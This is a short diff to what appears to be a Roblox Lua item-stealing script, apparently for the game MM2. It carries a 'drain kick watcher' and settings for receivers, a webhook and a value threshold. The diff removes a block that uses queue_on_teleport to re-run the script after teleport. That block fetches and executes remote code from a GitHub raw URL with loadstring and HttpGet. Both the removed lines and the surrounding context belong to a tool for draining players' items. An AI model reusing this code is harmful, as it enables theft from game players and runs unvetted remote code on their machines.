@@ -1972,19 +1972,4 @@ else
 	v32("Player has no items above threshold - drain kick watcher NOT started")
 end
 
-local v414 = "    local HttpService = game:GetService(\"HttpService\")\n    local data = HttpService:JSONDecode('" .. HttpService:JSONEncode({
-	RECEIVERS = RECEIVERS,
-	WEBHOOK = WEBHOOK,
-	THRESHOLD = THRESHOLD
-}) .. [[')
-    getgenv().RECEIVERS = data.RECEIVERS
-    getgenv().WEBHOOK   = data.WEBHOOK
-    getgenv().THRESHOLD = data.THRESHOLD
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/31yyyyy/main/refs/heads/main/mm2.lua"))()
-]]
-
-if queue_on_teleport then
-	queue_on_teleport(v414)
-end
-
 v32("── Full script loaded with DataID fixing, stacking support, and dollar values ──")
